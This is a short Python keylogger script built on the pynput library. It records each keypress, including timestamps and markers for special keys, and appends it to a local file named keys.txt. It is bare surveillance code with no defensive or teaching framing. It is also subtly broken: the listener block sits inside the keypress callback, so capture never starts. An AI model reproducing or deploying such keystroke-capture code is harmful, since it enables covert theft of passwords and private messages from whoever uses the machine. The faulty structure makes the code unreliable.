from pynput.keyboard import Listener, Key
from datetime import datetime


def keypress(key):
    with open("keys.txt", "a") as file:
          timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
          if key == Key.space:
             file.write("[SPACE]\n")
          elif key == Key.enter:
              file.write("[ENTER]\n")
          elif key == Key.backspace:
             file.write("[BACKSPACE]\n")
          elif hasattr (key, 'char'):
               file.write(f"[{timestamp}] {key.char}\n")
          elif key == Key.esc:
               file.write("Exiting...")
               return False
          else:
               file.write(f'[{timestamp}] {key}')
    

    with Listener(on_press=keypress) as listener:
        listener.join()

